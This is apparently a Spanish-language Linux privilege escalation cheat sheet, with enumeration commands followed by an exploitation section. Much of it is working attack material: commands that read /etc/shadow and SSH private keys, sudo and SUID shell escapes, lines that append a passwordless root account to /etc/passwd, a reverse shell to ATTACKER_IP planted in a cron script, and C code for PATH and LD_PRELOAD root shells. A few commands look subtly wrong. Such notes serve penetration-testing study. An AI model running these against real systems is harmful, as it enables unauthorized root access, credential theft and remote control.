# Enumeration: Linux privilege escalation

## 🔍 Sección 1: Enumeración

### Enumeracion Automatica

* LinPeas

* [LinEnum](https://github.com/rebootuser/LinEnum)

* [LES](https://github.com/The-Z-Labs/linux-exploit-suggester)

* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

* [Linux Priv Check](https://github.com/linted/linuxprivchecker)

### 1️⃣ Información del sistema

```bash
uname -a                   # Versión del kernel
/proc/version		   # Informacion de procesos del sistema
cat /etc/os-release        # Información de la distribución
cat /etc/issue		   # Info OS					
arch                       # Arquitectura del sistema
sudo -V
dmesg | tail 		   # Últimos mensajes del kernel
hostname
```

### 2️⃣ Usuarios y grupos

```bash
whoami                           # Usuario actual

id                               # UID y grupos

who -a                           # Usuarios conectados

last                             # Últimos logins

cat /etc/passwd                  # Lista de usuarios

cat /etc/passwd | cut -d ":" -f 1

cat /etc/passwd | grep "home"

cat /etc/shadow                  # Hashes de contraseñas (requiere root)

getent passwd                    # Usuarios desde NSS

sudo -l                          # Comandos sudo disponibles

groups <usuario>
```

### 3️⃣ Permisos y archivos sensibles

```bash
find / -perm -4000 2>/dev/null                      # Binarios con SUID

find / -perm -2000 2>/dev/null   	            # Binarios con SGID

find / -perm -u=s -type f 2>/dev/null

find / -type f -writable 2>/dev/null                # Archivos con permisos de escritura

find /home -name '.*history' 2>/dev/null            # Historial de comandos

find / -type f -perm -g=w -group <grupo> 2>/dev/null       # Archivos con permiso de escritura por el grupo

find / -type f -writable -user $(whoami) 2>/dev/null       # Archivos escribibles por tu usuario actual (sin importar grupo)


# Directorios

find / -writable -group <grupo> 2>/dev/null                # directorios (para escribir archivos dentro)

find / -writable -type d 2>/dev/null

find / -perm -222 -type d 2>/dev/null

find / -perm -o w -type d 2>/dev/null

find / -perm -o x -type d 2>/dev/null

find / -type d -name config 	# Directorios config 


# Herramientas de desarrollo y lenguajes

find / -name perl*

find / -name python*

find / -name gcc*

# More files

find / -type f -perm -g=w -perm -111 -group <grupo> 2>/dev/null       # Buscar archivos ejecutables escribibles por el grupo

find / -type f -perm -g=w -uid 0 -mtime -7 2>/dev/null           # Buscar ficheros en paths críticos con group+w

find /<directorio> -type d -perm -2 -ls 2>/dev/null

find / -user root -writable 2>/dev/null             # Archivos root escribibles

find / -type f -name '*.db' 2>/dev/null		    # Archivos base de datos

find / -type f -perm 0777 			# Archivos ejecutables legibles y escribibles por todos los usuarios

find / -perm a=x	# Ejecutables

find / -mtime 10	# Archivos modificados en los ultimos 10 dias

find / -atime 10	# Archivos accedidos en los ultimos 10 dias

find / -cmin -60	# Archivos modificados en la ultima hora

find / -amin -60	# Archivos accedidos en la ultima hora

find / -size 50M	# Especificacion de tamano de archivos: +100M (archivos mayores a 100MB)
```

### Credenciales

```bash
# opciones:

--include="*.ini"
--include="*.yaml"
--include="*.yml"
--include="*.json"
--include="*.conf"
--include="*.xml"

grep -rniI --include="*.conf" --include="*.ini" --include="*.yaml" --include="*.yml" --include="*.json" "PASSW\|PASSWD\|PASSWORD\|PWD" / 2>/dev/null

# V2
grep -rniI --include=*.{conf,ini,yaml,yml,json,php} "PASSW\|PASSWD\|PASSWORD\|PWD" / 2>/dev/null

# Buscar en el directorio sobre el que estamos posicionados, ejemplo con .xml

grep -RiE "user|username|login|password|passwd|secret|apikey|api_key|token" --include="*.xml" .

# Encontrar todos los .xml en el directorio actual

find . -type f -iname "*.xml"

# ver nombre de archivo + línea coincidente
grep -RniE "user|username|login|password|passwd|secret|apikey|api_key|token" --include="*.xml" .

#más “limpio” (solo nombre de archivo)

grep -RliE "user|username|login|password|passwd|secret|apikey|api_key|token" --include="*.xml" .

# solo los archivos a los que tenés permiso de lectura

find . -type f -readable -exec grep -iE "password|secret|token" {} \; 2>/dev/null

# nombres de archivos que sugieran credenciales en directorio actual

find . -type f -iname "*pass*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*.pem" -o -iname "*.key" -o -iname "*.id_rsa"



find / -exec ls -lad $PWD/* "{}" 2>/dev/null \; | grep -i -I "passw\|pwd"

locate 'passw'
locate 'pwd'
locate '*.php'
```


### 4️⃣ Procesos y tareas en ejecución

```bash
ps -A				# View all running processes

ps axjf				# 

ps aux | grep root              # Procesos ejecutados por root

ps -ef --forest                 # Jerarquía de procesos

ps -ef | grep <proceso>         # Información de un proceso específico

cat /proc/sched_debug | head    # Info de procesos

lsof -i                         # Conexiones activas
```

### 5️⃣ Servicios y conexiones

```bash
netstat -a 		     # Todos los puertos abiertos y todas las conexiones
netstat -at		     # Lista de puertos y conexiones TCP
netstat -au		     # Lista de puertos y conexiones UDP
netstat -lt		     # Puertos en "listening" listos para recibir conexiones TCP
netstat -s 		     # Estadisticas de uso de red. Puede ser usado con -t o -u para filtrar por protocolo
netstat -tp		     # Lista conexiones con nombres de servicios y PID puede ser usado con -l para listar puertos: -ltp
netstat -i	             # Estadisitacas de uso de interfaces
netstat -ano 		     # 		
netstat -tulnp               # Puertos abiertos y servicios activos
ss -tulnp                    # Alternativa a netstat
iptables -L                  # Reglas de firewall
systemctl list-units --type=service  # Servicios activos
systemctl list-units --type=service --all
```

### 6️⃣ Cron jobs y timers

```bash
ps -auxf | grep -E 'cron'
ls -lah /etc/cron*           # Revisar cron jobs
cat /etc/crontab            # Tareas programadas
systemctl list-timers       # Timers activos
systemctl list-timers --all
```

### 7️⃣ Variables de entorno

```bash
env                         # Variables de entorno
echo $PATH                  # Directorios en PATH
cat /etc/profile            # Variables globales
cat ~/.bashrc
```

### 8️⃣ Capacidades de binarios

```bash
getcap -r / 2>/dev/null     # Binarios con capacidades especiales
```

### 9️⃣ Contenedores y Docker

```bash
docker ps -a                # Contenedores en ejecución
cat /etc/group | grep docker # Ver si el usuario está en el grupo docker
ls -la /var/run/docker.sock
```

## 💥 Sección 2: Explotación

### 1️⃣ Explotación de SUDO mal configurado

```bash
sudo -l                     # Ver permisos sudo
sudo su                     # Si NOPASSWD está habilitado
sudo <comando>              # Ejecutar comandos con sudo
sudo -u root <comando>

# Ejemplos
sudo vim -c ':!/bin/sh'
sudo nmap --interactive
sudo find / -exec /bin/sh \;
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### 2️⃣ SUID/SGID abuse

```bash
find / -type f -perm -04000 -ls 2>/dev/null # Lista archivos SUID o SGID 

find / -perm -4000 2>/dev/null   # Buscar archivos con SUID

find / -perm -2000 2>/dev/null   # Buscar archivos con SGID

find / -perm -4000 -type f 2>/dev/null | xargs ls -la 

find / -perm /4000 -type f 2>/dev/null | xargs -r ls -la

chmod 4755 /bin/bash             # Inyectar 
/bin/bash -p                     # Ejecutar bash con privilegios SUID
./vim -c ':!/bin/sh'

```

### 3️⃣ Malos permisos en archivos y directorios

```bash
# Opcion 1
openssl passwd -1 -salt <salt value> <password>
openssl passwd newpass  # genera salt aleatoria 
<password_generada_con_openssl>
echo 'root::0:0:<password_generada_con_openssl>:::/bin/bash' >> /etc/passwd  # Crear usuario root

# Opcion 2

echo "root2::0:0::/root:/bin/bash" >> /etc/passwd
su root2
```

### 4️⃣ Tareas cron y servicios inseguros

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /path/to/vulnerable_script.sh
```

### 5️⃣ Variables de entorno peligrosas // sudo

```bash
# PATH

Ejemplo de script:

#include<unistd.h>
void main(){
setuid(0);
setgid(0);
system("<script>");

Compilamos:
gcc path_exp.c -o path -w

-------------------------

1. Que directorios hay en $PATH? 

echo $PATH

2.  Tiene mi usuario permisos de escritura sobre alguno de estos directorios? 

find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

3. Puedo modificar $PATH? (desde /home/my-user/desktop )
 
export PATH=/tmp:$PATH  #Si vemos /tmp: al ejecutar echo $PATH queda confirmado

4. Hay algun script/aplicacion que podamos ejecutar que sea afectado por esta vulnerabilidad? ( desde /tmp )

echo "/bin/bash" > <script>

chmod 777 <script>

ls -l <script>

( desde /home/my-user/desktop )

./path



export PATH=/tmp:$PATH       # Modificar PATH
export LD_PRELOAD=/tmp/malicioso.so  # Cargar biblioteca maliciosa

export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/service
chmod +x /tmp/service
sudo vulnerable_binary

# LD_PRELOAD

-----------
 opcion 1:
-----------

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

-----------
 opcion 2:
-----------

echo 'void __attribute__((constructor)) init(){setuid(0); system("/bin/bash");}' > /tmp/x.c

gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <comando> // ejemplo: find ls cat etc..
```

### 6️⃣ Explotación de procesos en ejecución

```bash
ps -ef | grep root
strace -p <PID>
gdb -p <PID>                # Adjuntar a un proceso
```

### 7️⃣ Explotación de servicios y configuraciones de red // NFS

```bash
cat /etc/exports
showmount -e <IP>           # Revisar NFS
mount -t nfs <IP>:/ /mnt
# Alternativa

mkdir /tmp/backups
mount -o rw <ip>:/backups /tmp/backups

# En /tmp/backups

* script de ejemplo

int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}

* compilamos

gcc nfs.c -o nfs -w

chmod -s nfs
```

### 8️⃣ Extracción de credenciales

```bash
cat ~/.bash_history         # Revisar historial de comandos
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
strings /proc/<PID>/mem | grep -i pass
```

### 9️⃣ Kernel Exploits

```bash
uname -r                    # Revisar versión del kernel
searchsploit <versión>      # Buscar exploits para el kernel
```

